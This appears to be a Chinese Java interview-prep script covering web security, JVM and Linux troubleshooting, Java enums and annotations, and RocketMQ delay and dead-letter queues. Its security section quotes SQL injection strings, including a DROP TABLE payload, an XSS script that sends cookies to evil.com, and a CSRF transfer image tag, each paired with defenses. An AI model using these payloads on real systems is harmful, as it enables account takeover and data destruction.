# 面试模拟 - Day 56

> 日期：2026-07-26（周日） | 模拟岗位：滴滴出行（杭州）- 金融事业部 - Java开发工程师
> 建议时长：85分钟（一面55分钟 + 二面30分钟）
> 使用方法：找个人帮你念追问（或自己读完主问题后，想30秒再翻追问），模拟真实面试对话节奏
>
> **今日特点**：Day56，"查漏补缺"阶段第五周。模拟滴滴杭州研发中心——金融事业部（滴滴金融/滴水贷/金融科技）。滴滴面试特点：偏工程实战而非纯理论、线上问题排查能力要求高、系统设计题和出行场景强相关、追问"你遇到过什么线上问题"。今天引入 Web 安全（SQL注入/XSS/CSRF/CORS）、Linux 线上排查实战、Java 枚举与注解原理、Elasticsearch 深入、RocketMQ 高级特性（延迟消息/死信队列）5 个全新话题——都是高频考点但之前没有作为独立话题系统考过的内容。

---

# 一面（55分钟）

## 话题一：Web 安全与防护（12分钟）

**面试官：你做金融系统，安全很重要。Web 常见的安全漏洞有哪些？SQL 注入你了解吗？怎么防？**

> 你回答...

**追问1：** 先说说 SQL 注入的原理。它是怎么发生的？MyBatis 的 `#{}` 和 `${}` 有什么区别？

> 你回答...（提示：SQL 注入原理与防护 / SQL 注入原理：①用户输入被拼接到 SQL 语句中 → 没有转义 → 用户输入了 SQL 关键字 → 改变了 SQL 语义 ②示例 → 登录查询：
```sql
-- 正常
SELECT * FROM user WHERE username = 'admin' AND password = '123456'
-- SQL注入：用户输入 username = 'admin' --  (注意后面有--)
SELECT * FROM user WHERE username = 'admin' --' AND password = '123456'
-- -- 后面是注释 → password条件被注释 → 密码随便填都能登录
```
③更严重 → `username = 'admin'; DROP TABLE user; --` → 执行两条SQL → 删表 ④根本原因 → 字符串拼接SQL → 用户输入的 `'` 闭合了字符串 → 后面的内容被当成SQL执行 / MyBatis `#{}` vs `${}`：①`#{}` → PreparedStatement 预编译 → 参数用 `?` 占位 → JDBC 的 `PreparedStatement.setString()` → 用户输入被当作字符串值 → 不会当作SQL执行 → 安全 ②`${}` → 字符串直接替换 → 拼接进SQL → 用户输入直接拼到SQL → SQL注入风险 ③`#{}` 底层 → `PreparedStatement` → 预编译SQL → `SELECT * FROM user WHERE username = ?` → 然后 `setString(1, "admin' --")` → 整个被当作字符串 → 不注入 ④`${}` 底层 → `Statement` → 直接拼接 → `SELECT * FROM user WHERE username = admin' --` → 语法错误或注入 / 什么时候必须用 `${}`：①动态表名 → `SELECT * FROM ${tableName}` → 表名不能用 `?` 占位(预编译不支持表名参数)→ 必须用 `${}` → 但要做白名单校验 ②动态排序 → `ORDER BY ${column}` → 列名不能用 `?` → 但要校验列名在白名单 ③动态SQL关键字 → `SELECT * FROM user WHERE ${condition}` → 一般不这么写 → 用动态标签 `<if><choose>` / 防护措施：①预编译(PreparedStatement)→ 最核心 → MyBatis的 `#{}` 底层就是预编译 ②输入校验 → 白名单 → 只允许字母数字 → 但有些场景需要特殊字符 ③ORM框架 → MyBatis/Hibernate → 默认预编译 ④最小权限 → 数据库账号只给必要的权限 → 不给DDL权限 → 即使注入也删不了表 ⑤WAF → Web应用防火墙 → 拦截SQL注入特征 → 如检测到 `UNION SELECT` / `DROP` / `--` 等 / 面试重点：SQL注入=字符串拼接+用户输入含SQL关键字 → 防=预编译PreparedStatement(MyBatis #{}=?占位)→ ${}是直接拼接有注入风险 → 表名/列名必须用${}要白名单校验 → 最小权限+WAF兜底）

**追问2：** XSS 攻击呢？CSRF 攻击呢？两者有什么区别？怎么防护？

> 你回答...（提示：XSS vs CSRF / XSS（Cross-Site Scripting 跨站脚本）：①攻击者 → 在网页中注入恶意JavaScript → 其他用户访问 → 浏览器执行恶意JS → 窃取Cookie/Session → 发送到攻击者服务器 ②示例 → 评论区 → 用户输入 `<script>document.location='http://evil.com?cookie='+document.cookie</script>` → 其他用户看评论 → 执行JS → Cookie被偷 ③类型 → 存储型(存到DB→所有访问者都中招/最严重)→ 反射型(URL参数注入→点击恶意链接才触发)→ DOM型(JS操作DOM注入) / CSRF（Cross-Site Request Forgery 跨站请求伪造）：①攻击者 → 诱导已登录用户 → 访问恶意页面 → 恶意页面 → 发起请求到银行网站 → 浏览器自动带上Cookie → 银行以为是用户操作 → 执行转账 ②示例 → 用户登录了银行 → 访问恶意网站 → `<img src="http://bank.com/transfer?to=hacker&amount=10000">` → 浏览器发起GET请求 → 带上银行的Cookie → 银行以为是用户转账 ③本质 → 冒用用户身份 → 利用Cookie自动携带的机制 / 区别：①XSS → 注入恶意脚本到受害者浏览的页面 → 执行JS → 窃取数据 ②CSRF → 冒用受害者身份 → 发起请求 → 执行操作 ③XSS → 信任了用户输入(没转义)→ CSRF → 信任了浏览器自动带Cookie(没验证请求来源) / XSS 防护：①输出转义 → 在HTML中输出用户输入 → 转义 `<>&'"` → `<` → `&lt;` → `>` → `&gt;` → `<script>` → `&lt;script&gt;` → 浏览器显示但不执行 ②HttpOnly Cookie → `Cookie` 设 `HttpOnly` → JS 的 `document.cookie` 读不到 → 即使XSS注入JS → 也偷不到Cookie ③CSP（Content Security Policy）→ HTTP头 `Content-Security-Policy: script-src 'self'` → 只允许加载本域的JS → 不允许内联 `<script>` → 不允许外部域JS ④富文本过滤 → 如允许用户发HTML(富文本编辑器)→ 用白名单过滤 → 只允许 `<b><i><a>` → 禁止 `<script><iframe>` / CSRF 防护：①Token → 服务端生成随机Token → 放在表单隐藏域 → 提交时验证Token → 恶意网站拿不到Token → 请求被拒 ②SameSite Cookie → `Set-Cookie: token=xxx; SameSite=Strict` → 跨站请求不带Cookie → Strict=完全不带 / Lax=导航时带(GET安全)→ Chrome默认Lax ③Referer检查 → 检查请求头Referer → 确保来自本站 → 但Referer可被篡改 ④关键操作二次验证 → 转账/支付 → 短信验证码/密码确认 → 即使CSRF也过不了 / 面试重点：XSS=注入恶意JS窃取数据 → 防=输出转义+HttpOnly Cookie+CSP → CSRF=冒用身份发起请求 → 防=Token+SameSite Cookie+Referer+二次验证 → XSS信任用户输入/CSRF信任浏览器Cookie）

**追问3：** CORS 你了解吗？跨域问题和安全有什么关系？怎么正确配置 CORS？

> 你回答...（提示：CORS 跨域资源共享 / 同源策略：①浏览器安全策略 → 脚本(JS)只能访问同源的资源 → 同源 = 协议+域名+端口 都相同 ②`https://bank.com` 的JS → 不能发AJAX请求到 `https://evil.com` → 浏览器拦截 ③目的 → 防止恶意网站读取其他网站的数据 → 如恶意网站的JS不能读银行的API返回 / 跨域问题：①前后端分离 → 前端 `https://app.bank.com` → 后端API `https://api.bank.com` → 不同域 → 浏览器拦截 ②需要CORS → 跨域资源共享 → 后端通过HTTP头告诉浏览器"允许xxx.com访问" / CORS 流程：①简单请求 → GET/POST/HEAD + 特定Content-Type → 直接发请求 → 后端返回 `Access-Control-Allow-Origin: https://app.bank.com` → 浏览器检查 → 匹配 → 放行 ②预检请求(Preflight)→ 非简单请求(PUT/DELETE/自定义Header)→ 浏览器先发OPTIONS → `Access-Control-Request-Method: PUT` + `Access-Control-Request-Headers: Authorization` → 后端返回 → `Access-Control-Allow-Methods: GET, POST, PUT, DELETE` + `Access-Control-Allow-Headers: Authorization, Content-Type` + `Access-Control-Max-Age: 3600` → 预检通过 → 再发真实请求 / 安全风险：①`Access-Control-Allow-Origin: *` → 允许所有域 → 任何网站都能调用 → 不安全 → 金融系统绝对不能 ②`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` → 浏览器不允许(矛盾)→ 如果允许携带Cookie → 不能用 `*` → 必须指定具体域名 ③正确配置 → 白名单 → 只允许已知的几个域名 / Spring Boot CORS 配置：
```java
// 方式一：全局配置
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
                .allowedOrigins("https://app.bank.com", "https://admin.bank.com")  // 白名单
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowedHeaders("*")
                .allowCredentials(true)  // 允许Cookie
                .maxAge(3600);  // 预检缓存1小时
    }
}

// 方式二：注解（单个Controller）
@CrossOrigin(origins = "https://app.bank.com")
@RestController
public class PayController { ... }
```
/ 和CSRF的关系：①CORS ≠ CSRF → CORS是浏览器同源策略的"放行机制" → CSRF是冒用身份的"攻击手段" ②配置错误 → `Allow-Origin: *` + `Allow-Credentials: true` → 等于关闭同源策略 → 任何网站都能带Cookie访问 → CSRF更容易 ③正确CORS → 白名单+指定具体域名 → 安全 / 面试重点：同源策略=协议+域名+端口 → CORS=后端通过HTTP头放行跨域 → 简单请求直接发/非简单请求先OPTIONS预检 → 安全风险=Allow-Origin:*不安全 → 正确=白名单+指定域名+Credentials要配合具体域名）

---

## 话题二：Linux 线上排查实战（12分钟）

**面试官：你做过线上问题排查吗？生产环境 CPU 突然飙到 100%，你怎么查？说具体命令。**

> 你回答...

**追问1：** 先说说 CPU 100% 的排查完整流程。从发现到定位，用哪些命令？

> 你回答...（提示：CPU 100% 排查流程 / 第一步：定位进程 → top ①`top` → 看系统整体 → CPU使用率 → 找到CPU最高的Java进程PID ②或 `top -c` → 显示完整命令行 → 确认是哪个Java应用 ③`top -Hp <pid>` → 看该进程内各线程的CPU → 找到CPU最高的线程TID（十进制）/ 第二步：定位线程 → jstack ①`printf "%x\n" <TID>` → 十进制TID转十六进制 → 如 12345 → 0x3039 ②`jstack <pid> | grep -A 30 "nid=0x3039"` → 在jstack输出中找这个线程的线程栈 → 看它在执行什么代码 ③`jstack <pid> | grep -A 30 "nid=0x3039" | grep -v "^$"` → 过滤空行 → 清晰看线程栈 ④常见原因 → 死循环(while(true)没退出)→ 频繁Full GC(GC线程占CPU)→ 正密计算(加密/序列化大数据)→ 锁竞争(自旋等待) / 第三步：一步到位 → arthas ①`arthas → thread -n 3` → 直接显示CPU最高的3个线程的线程栈 → 不用手动转换 ②`thread <TID>` → 查看指定线程 ③`dashboard` → 实时看整体状态 → CPU/内存/GC/线程 / 如果是GC导致 → ①`jstat -gcutil <pid> 1000 5` → 每秒打印1次GC统计 → 连续5次 → 看Full GC频率和耗时 → 如果FGC一直在涨 → 频繁Full GC ②`jmap -heap <pid>` → 看堆内存使用 → 各区域使用率 → 看是不是老年代满了 ③`jmap -histo:live <pid> | head -20` → 看存活对象按大小排序 → 找最大的对象类型 → 可能内存泄漏 ④arthas → `dashboard` → 看GC情况 → 或 `profiler start; profiler stop --format html` → 生成火焰图 / 生产排查三板斧总结：①top → 定位进程 ②`top -Hp` + jstack → 定位线程 ③arthas → 一键诊断（thread/dashboard/profiler）→ 火焰图 / 面试重点：CPU 100% → top定位进程 → top -Hp定位线程 → printf转十六进制 → jstack看线程栈 → arthas thread -n 3一步到位 → 如果GC导致→jstat -gcutil+jmap -histo）

**追问2：** 如果是 OOM 呢？生产环境突然 OOM 了，你怎么快速处理？

> 你回答...（提示：OOM 快速处理流程 / 前提：生产必须配置 → `-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/data/log/heapdump.hprof` → OOM时自动dump / 快速处理：①OOM → 应用挂了 → 如果有K8s → 自动重启(Pod健康检查失败→重启)→ 快速恢复 ②但先别急着重启 → 先拿dump文件 → 如果应用还半活着 → `jmap -dump:format=b,file=/tmp/heap.hprof <pid>` → 手动dump ③dump完 → 重启应用 → 恢复服务 ④分析dump → MAT打开 → Leak Suspects → 找泄漏点 ⑤但dump文件可能很大(几GB)→ 下载到本地分析 → 或用在线工具 ⑥紧急止血 → 先重启 → 恢复服务 → 再慢慢分析 / MAT 分析流程：①Leak Suspects → 自动分析 → 报告"疑似泄漏点" ②Dominator Tree → 按持有内存大小排序 → 最大的对象排前面 ③找最大对象 → 右键 → Path to GC Roots → excluding weak/soft references → 找到引用链 → 谁持有了这个对象导致GC不了 ④常见发现 → 一个 HashMap 存了100万条数据 → 没有清理 → 一直被引用 → GC不了 → 内存泄漏 ⑤Histogram → 按类统计 → 如 `byte[]` 有100万个 → 不正常 ⑥OQL(Object Query Language)→ 类SQL查询堆中对象 → 如 `SELECT * FROM java.util.HashMap WHERE size > 10000` / 常见OOM原因和解决：①内存泄漏 → 静态集合/ThreadLocal没remove/缓存无淘汰 → 找到泄漏点 → 修代码 ②内存溢出 → 一次性加载太多 → `SELECT * FROM big_table` 无分页 → 改成分页/流式查询 ③元空间OOM → 动态生成类太多(CGLIB/Groovy)→ 增大MaxMetaspaceSize / 线程OOM → `Unable to create new native thread` → 线程池没限制 → 限制线程数 / 生产环境灰度排查：①如果OOM是偶发 → 不一定每次都dump → 等下次触发 → 自动dump → 再分析 ②如果频繁 → 先加大内存(-Xmx)→ 临时缓解 → 分析dump根因 → 修复 / 面试重点：OOM → 先确保有自动dump配置 → 紧急时jmap手动dump → 重启恢复 → MAT: Leak Suspects+Dominator Tree+Path to GC Roots → 常见原因=静态集合/ThreadLocal/缓存无淘汰/大查询无分页 → 先加内存止血再修根因）

**追问3：** 线上接口突然变慢，RT 从 50ms 涨到 2 秒，怎么排查？

> 你回答...（提示：RT 飙高排查 / 分层排查思路 → 从外到内逐层排除：①网络层 → DNS/TCP/带宽 ②应用层 → JVM(GC/锁/线程池)③依赖层 → DB/Redis/MQ/第三方接口 / 第一步：确认范围 ①是单个接口慢还是全部接口慢 → 全部慢 → 全局问题(JVM/GC/网络)→ 单个接口慢 → 该接口逻辑/依赖问题 ②看APM → SkyWalking/Pinpoint → 接口调用链 → 哪个环节慢 → 一目了然 / 第二步：排查 JVM ①`jstat -gcutil <pid> 1000 5` → Full GC频繁 → STW → 接口暂停 → RT飙高 ②jstack → 看线程状态 → 如果大量线程BLOCKED → 锁竞争 → 接口等待锁 → 慢 ③jstack → 看线程在等什么 → `waiting to lock <0x...>` → 找到锁持有者 / 第三步：排查 DB ①慢查询日志 → `slow_query_log` → 最近有没有慢SQL ②Druid监控 → SQL执行时间 → 平均/最大/最近 → 如果平均从10ms涨到500ms → DB有问题 ③`SHOW PROCESSLIST` → 看MySQL当前执行的SQL → 如果大量Sending data/copying to tmp table → SQL慢 ④原因 → 索引失效/数据量增长/锁等待/连接池满 / 第四步：排查 Redis ①Redis → `SLOWLOG GET 10` → 慢命令 → KEYS*/HGETALL大Hash ②Redis延迟 → `redis-cli --latency` → 如果延迟从0.1ms涨到10ms → Redis变慢 → 可能大Key删除/持久化阻塞/网络 ③连接池 → 如果Redis连接池满 → 请求等连接 → RT高 / 第五步：排查下游服务 ①Feign/Dubbo调用 → APM看下游服务RT → 如果下游从50ms涨到1秒 → 链路传导 ②超时配置 → 下游超时5秒 → 但下游实际要3秒 → 调用方等3秒 → RT高 → 调整超时 / 第六步：排查资源 ①CPU → top → 如果CPU 90%+ → 可能是GC或大量计算 → 接口变慢 ②网络 → iftop/iftat → 带宽是否打满 ③磁盘 → iostat → 如果磁盘IO 100% → 磁盘满/频繁写日志 / 典型场景：①GC导致 → Full GC STW 500ms → 所有接口变慢 → 每隔几秒抖一下 → jstat看GC → 优化GC参数/修内存泄漏 ②DB慢SQL → 某个SQL没走索引 → 全表扫描 → 从1ms涨到500ms → 慢日志+EXPLAIN → 加索引 ③Redis连接池满 → 突发流量 → 连接池耗尽 → 请求等连接 → RT高 → 调大连接池/加限流 ④锁竞争 → synchronized保护的方法 → 并发高时排队 → RT线性增长 → 换ConcurrentHashMap/分段锁 / 面试重点：RT高 → 分层排查 → 确认范围(APM看调用链)→ JVM(jstat看GC/jstack看锁)→ DB(慢日志+PROCESSLIST+EXPLAIN)→ Redis(SLOWLOG+latency)→ 下游(APM看下游RT)→ 资源(CPU/网络/磁盘)）

---

## 话题三：Java 枚举与注解原理（11分钟）

**面试官：Java 的枚举你了解吗？为什么 Effective Java 推荐用枚举实现单例？注解的底层原理呢？**

> 你回答...

**追问1：** 先说说枚举的本质。Java 的 enum 在编译后是什么？为什么它天然线程安全？

> 你回答...（提示：枚举原理 / 枚举的本质：①Java 的 `enum` → 编译后是一个 `final class` → 继承 `java.lang.Enum` ②枚举值 → 是该类的 `public static final` 静态常量 ③反编译后：
```java
// 你写的
public enum Color { RED, GREEN, BLUE; }

// 编译后（反编译近似）
public final class Color extends java.lang.Enum<Color> {
    public static final Color RED = new Color("RED", 0);
    public static final Color GREEN = new Color("GREEN", 1);
    public static final Color BLUE = new Color("BLUE", 2);
    private static final Color[] $VALUES = {RED, GREEN, BLUE};

    private Color(String name, int ordinal) {
        super(name, ordinal);
    }
    public static Color[] values() { return $VALUES.clone(); }
    public static Color valueOf(String name) { return Enum.valueOf(Color.class, name); }
}
```
④`Enum` 的构造器 → `protected Enum(String name, int ordinal)` → name是枚举名 → ordinal是序号(0开始) ⑤枚举值在类加载时创建 → static初始化 → JVM保证类加载线程安全 → 所以枚举天然线程安全 / 枚举实现单例（Effective Java 推荐）：
```java
public enum Singleton {
    INSTANCE;
    public void doSomething() { ... }
}
// 使用：Singleton.INSTANCE.doSomething();
```
①为什么安全 → 线程安全：类加载时创建 → JVM保证 → 不需要DCL ②防反射攻击：`Constructor` 的 `newInstance()` 方法 → 对枚举类型直接抛 `IllegalArgumentException: Cannot reflectively create enum objects` → 反射无法创建枚举实例 ③防序列化攻击：枚举的序列化/反序列化 → JVM特殊处理 → 序列化时只写name → 反序列化时通过 `Enum.valueOf()` 返回已有实例 → 不会创建新对象 → 不需要 `readResolve()` ④防克隆攻击：Enum 的 `clone()` → `throw new CloneNotSupportedException()` → 不能克隆 / 和DCL单例对比：①DCL → 要加volatile(防指令重排)→ 要double-check → 代码复杂 → 还有反射和序列化漏洞 ②枚举 → 代码简洁 → 四种攻击全部免疫 → Effective Java推荐 ③唯一缺点 → 不能延迟加载 → 类加载时就创建 → 但单例一般也不需要延迟 → 如果要延迟 → 用静态内部类 / 枚举的 values() 和 valueOf()：①`values()` → 返回所有枚举值的数组 → 每次返回clone → 防止外部修改 ②`valueOf(String name)` → 通过name找枚举 → 用HashMap缓存(name→枚举实例)→ O(1) ③`ordinal()` → 返回序号 → 但不要依赖ordinal做业务逻辑 → 如果重新排列枚举值 → ordinal变化 → bug ④`name()` → 返回枚举名 / 枚举的高级用法：①带属性的枚举 → `RED("#FF0000")` → 构造器接收 → 字段存储 ②带方法的枚举 → 每个枚举值可以有自己的方法实现(抽象方法)③实现接口 → 枚举可以实现接口 → 策略模式 ④枚举集合 → `EnumSet` → 用位向量实现(一个long的64位表示64个枚举)→ 极快 → `EnumMap` → 用数组实现 → key是枚举 → O(1) / 面试重点：enum编译后=final class继承Enum+静态常量实例 → 类加载创建(JVM保证线程安全)→ 单例=防反射(构造器拒绝)+防序列化(valueOf返回已有)+防克隆(抛异常)→ DCL要volatile+double-check但还有漏洞 → 枚举四重免疫 → Effective Java推荐）

**追问2：** 注解的底层原理是什么？`@Retention` 和 `@Target` 各有什么作用？

> 你回答...（提示：注解原理 / 注解本质：①注解 → 是一个继承 `java.lang.annotation.Annotation` 的接口 ②编译后 → 注解是接口 → `@interface` → 编译后是一个 interface ③注解的属性 → 接口的方法 → `String value()` → 方法返回值就是属性类型 / 元注解（注解注解的注解）：①`@Retention(RetentionPolicy.SOURCE)` → 注解只在源码存在 → 编译后丢弃 → 如 `@Override` → 编译器检查方法是否重写 → 检查完就丢 ②`@Retention(RetentionPolicy.CLASS)` → 注解保留到class文件 → 但运行时不加载 → 默认策略 → 字节码增强工具(ASM/Javassist)可用 ③`@Retention(RetentionPolicy.RUNTIME)` → 注解保留到运行时 → 可以通过反射读取 → **这是最常用的** → Spring/Spring Boot大量用 ④`@Target(ElementType.TYPE)` → 注解可以标注在哪里 → TYPE(类/接口)→ METHOD(方法)→ FIELD(字段)→ PARAMETER(参数)→ CONSTRUCTOR(构造器)→ LOCAL_VARIABLE → ANNOTATION_TYPE(注解)→ PACKAGE → TYPE_PARAMETER(泛型参数-Java 8)→ TYPE_USE(类型使用-Java 8)⑤`@Inherited` → 子类是否继承父类的注解 → 默认不继承 → 加了@Inherited → 子类自动有 ⑥`@Documented` → 是否出现在Javadoc中 ⑦`@Repeatable` → 同一个位置可以重复标注 → Java 8+ / 运行时注解读取：
```java
// 定义注解
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface MyLog {
    String value() default "";
}

// 使用
@MyLog("查询用户")
public User getUser(Long id) { ... }

// 反射读取
Method method = clazz.getMethod("getUser", Long.class);
if (method.isAnnotationPresent(MyLog.class)) {
    MyLog log = method.getAnnotation(MyLog.class);
    String value = log.value();  // "查询用户"
}
```
/ Spring 中注解的运作机制：①`@Component` → `@Retention(RUNTIME)` + `@Target(TYPE)` → Spring启动时 → ClassPathBeanDefinitionScanner扫描 → 找到标注了@Component的类 → 注册为Bean ②`@RequestMapping` → `@Retention(RUNTIME)` + `@Target(METHOD)` → RequestMappingHandlerMapping扫描 → 找到标注的方法 → 注册URL映射 ③`@Autowired` → `@Retention(RUNTIME)` + `@Target(FIELD)` → AutowiredAnnotationBeanPostProcessor → 在Bean初始化时 → 反射读取字段上的@Autowired → 注入依赖 / 自定义注解 + AOP 实战（日志/权限/幂等）：
```java
// 1. 定义注解
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface RequirePermission {
    String value();  // 权限码
}

// 2. AOP切面
@Aspect
@Component
public class PermissionAspect {
    @Around("@annotation(requirePermission)")
    public Object check(ProceedingJoinPoint pjp, RequirePermission requirePermission) throws Throwable {
        String permission = requirePermission.value();
        User user = SecurityContext.getCurrentUser();
        if (!user.hasPermission(permission)) {
            throw new AuthException("无权限：" + permission);
        }
        return pjp.proceed();  // 放行
    }
}

// 3. 使用
@RestController
public class UserController {
    @RequirePermission("user:delete")
    @DeleteMapping("/user/{id}")
    public void delete(@PathVariable Long id) { ... }
}
```
①注解 = 标记 → AOP = 拦截 → 反射读取注解值 → 执行逻辑 → 业务代码零侵入 ②这就是Spring AOP+自定义注解的核心模式 → 日志/权限/限流/幂等/缓存 → 都用这套 / 面试重点：注解=继承Annotation的接口 → @Retention(SOURCE编译丢弃/CLASS字节码保留/RUNTIME反射可读最常用)→ @Target(标注位置)→ @Inherited(子类继承)→ 运行时用反射isAnnotationPresent/getAnnotation读取 → Spring@Component/RequestMapping/Autowired都是RUNTIME注解+后处理器扫描 → 自定义注解+AOP=日志/权限/幂等零侵入）

---

## 话题四：RocketMQ 高级特性（12分钟）

**面试官：RocketMQ 你用过。延迟消息你了解吗？死信队列呢？这些在金融系统里怎么用？**

> 你回答...

**追问1：** 先说说 RocketMQ 的延迟消息。它是怎么实现的？有哪些级别？

> 你回答...（提示：延迟消息 / 延迟消息原理：①Producer 发送消息时 → 设置 `delayLevel` → 如 `message.setDelayLevel(3)` → 对应10秒 ②Broker 收到消息 → 不是直接放入Topic队列 → 而是放入特殊Topic `SCHEDULE_TOPIC_XXXX` → 按 delayLevel 分队列存储 ③后台调度服务 → 定时扫描每个 delayLevel 队列 → 到期消息 → 重新投递到原始Topic → Consumer才能消费 ④RocketMQ 4.x → 18个固定延迟级别：
```
1s 5s 10s 30s 1m 2m 3m 4m 5m 6m 7m 8m 9m 10m 20m 30m 1h 2h
1  2  3   4   5  6  7  8  9  10 11  12  13  14  15  16  17  18
```
⑤RocketMQ 5.x → 支持任意延迟 → `message.setDeliverTime(timestamp)` → 基于时间轮(Time Wheel)→ 精确到毫秒 / 为什么 4.x 用固定级别：①固定级别 → 每个级别一个队列 → 扫描简单 → 按 delayLevel 分队列 → 取消息按时间排序 → 到期投递 ②任意延迟 → 消息延迟时间各不相同 → 排序复杂 → 用时间轮(HashedWheelTimer)→ 按延迟时间hash到时间轮的slot → 到期触发 / 金融系统应用场景：①订单超时关闭 → 用户下单30分钟未支付 → 发延迟消息(delayLevel=16=30分钟)→ 30分钟后消费 → 检查订单状态 → 未支付 → 关闭订单 → 释放库存 ②延时通知 → 交易完成 → 5分钟后发提醒消息 → delayLevel=2(5秒)不对 → 用delayLevel=1(1秒)+定时任务 → 或直接用定时任务 ③定时提醒 → 信用卡还款日前3天 → 发提醒 → 但延迟时间不固定(几十天)→ RocketMQ 4.x最大2小时 → 不够 → 用定时任务(XXL-JOB) ④重试延迟 → 消费失败 → 延迟重试 → RocketMQ消费失败默认延迟重试(10s/30s/1m/2m...)→ 16次后进死信 / 和延迟队列对比：①RabbitMQ → 死信队列+TTL → 消息过期进死信 → Consumer监听死信 → 灵活但复杂 ②RocketMQ → 原生支持 → 简单 ③Redis → ZSET(score=到期时间)→ 定时扫描 → 但Redis不保证可靠性(宕机可能丢)④Kafka → 不原生支持 → 需要自己实现(多Topic+时间轮) / 面试重点：延迟消息=发到SCHEDULE_TOPIC按delayLevel分队列→后台扫描到期重新投递→4.x有18个固定级别(1s到2h)→5.x任意延迟(时间轮)→场景=订单超时关闭/重试延迟 → 4.x最大2小时→超长用XXL-JOB）

**追问2：** 死信队列呢？消息消费失败后，最终去了哪里？

> 你回答...（提示：死信队列 / 消费重试机制：①Consumer消费失败 → 返回 `RECONSUME_LATER`（稍后重试）→ Broker收到失败 → 延迟重试 ②重试间隔（默认16次）→ 10s → 30s → 1m → 2m → 3m → 4m → 5m → 6m → 7m → 8m → 9m → 10m → 20m → 30m → 1h → 2h → 总共约4.6小时 ③每次重试 → 消息进入 `RETRY Topic` → Consumer消费RETRY Topic → 再次执行 ④16次都失败 → 消息进入死信队列(DLQ=Dead Letter Queue) / 死信队列结构：①死信Topic → `%DLQ%ConsumerGroup` → 如 `%DLQ%order_consumer_group` ②死信消息 → 和原消息内容一样 → 但标记为死信 → Consumer默认不再消费 ③需要人工处理 → 运维人员 → 控制台查看死信 → 分析失败原因 → 修复后 → 重新投递 / 为什么需要死信队列：①防止消息丢失 → 消费16次都失败 → 不能直接丢弃 → 放入死信 → 保留 ②隔离 → 死信消息和正常消息分开 → 不影响正常消费 → 正常Topic的消费者不会被死信阻塞 ③人工介入 → 持续失败 → 可能是代码bug/数据异常 → 需要人工排查 → 修复后重投 / 死信处理方案：①控制台手动重投 → RocketMQ Dashboard → 选死信消息 → 重新发送到原Topic ②程序自动 → 写一个死信消费者 → 消费 `%DLQ%xxx` → 发告警 → 或自动修复后重投 ③监控告警 → 死信队列有消息 → 飞书/钉钉告警 → 人工第一时间处理 / 和Kafka对比：①Kafka → 消费失败 → 只能跳过(offset+1)→ 或重试(不提交offset)→ 没有原生死信队列 → 需要自己实现 ②RocketMQ → 原生支持重试+死信 → 金融场景更友好 / 消费幂等和死信的关系：①消费失败 → 重试 → 但重试可能导致重复消费 → 所以消费端必须幂等 ②幂等 → 用唯一键(订单号+操作类型)→ Redis SETNX → 或DB唯一约束 ③16次重试 → 即使每次都幂等 → 最终还是失败 → 进死信 → 人工 / 金融系统死信场景：①扣款失败 → 消费支付结果消息 → 调下游扣款 → 下游不可用 → 重试16次 → 2小时 → 还是不行 → 死信 → 告警 → 人工处理 → 检查下游 → 修复 → 重投 ②对账差异 → 消费对账消息 → 发现差异 → 处理失败 → 重试 → 进死信 → 人工核实 / 面试重点：消费失败→延迟重试16次(10s到2h共4.6小时)→16次都失败→进死信队列%DLQ%ConsumerGroup→隔离不影响正常消费→人工处理/控制台重投/程序自动 → Kafka没有原生死信→RocketMQ金融级友好）

**追问3：** RocketMQ 的消息过滤你了解吗？Tag 过滤和 SQL92 过滤有什么区别？

> 你回答...（提示：消息过滤 / Tag 过滤：①Producer → 发消息时设置Tag → `Message msg = new Message("Topic", "TagA", body)` → 一个Topic下可以有多个Tag ②Consumer → 订阅时指定Tag → `consumer.subscribe("Topic", "TagA || TagTagB")` → 只消费TagA和TagB的消息 ③原理 → Broker端过滤 → Broker根据Tag hashcode → 快速过滤 → 不匹配的Tag → 不投递给Consumer → 减少网络传输 ④但Tag只是一个字符串 → 简单匹配 → 不支持复杂条件 ⑤场景 → Topic=交易消息 → Tag=PAY(支付)/REFUND(退款)/TRANSFER(转账)→ Consumer只消费REFUND / SQL92 过滤：①Producer → 发消息时设置属性 → `message.putUserProperty("amount", "10000")` + `message.putUserProperty("region", "hangzhou")` ②Consumer → 用SQL92语法过滤 → `consumer.subscribe("Topic", MessageSelector.bySql("amount > 5000 AND region = 'hangzhou'"))` → 只消费金额>5000且杭州的交易 ③原理 → Broker端 → 解析SQL92 → 对比消息属性 → 匹配才投递 ④比Tag灵活 → 支持复杂条件 → 但Broker解析有开销 → 性能略低 / 区别：①Tag → 简单字符串匹配 → 快 → 但只能等值匹配 → 不能比较大小 ②SQL92 → 复杂条件 → 灵活 → 但Broker解析有开销 ③实际 → 大部分场景用Tag → 足够简单 → 需要复杂条件用SQL92 / Consumer本地过滤 vs Broker过滤：①Broker过滤 → Broker根据过滤条件 → 只投递匹配的消息 → 节省网络 ②Consumer本地过滤 → Broker全量投递 → Consumer自己过滤 → 网络浪费 ③RocketMQ → 默认Broker过滤Tag/SQL92 → 但也可以配置Consumer端过滤 ④Tag的hashcode → Broker先用hashcode快速判断 → 不匹配跳过 → hash冲突再对比字符串 / 面试重点：Tag=字符串简单匹配快/Broker过滤省网络/Topic下分类 → SQL92=属性条件复杂查询灵活/Broker解析有开销 → 大部分用Tag足够 → 需要条件查询用SQL92）

---

## 话题五：手写代码 - 实现令牌桶限流器（8分钟）

**面试官：写一个简单的令牌桶限流器。要求：固定速率生成令牌，桶有最大容量，请求来时取令牌，取不到就拒绝。**

你在纸上/白板上写代码...

**追问1：** 先说说你的思路。令牌桶和漏桶有什么区别？

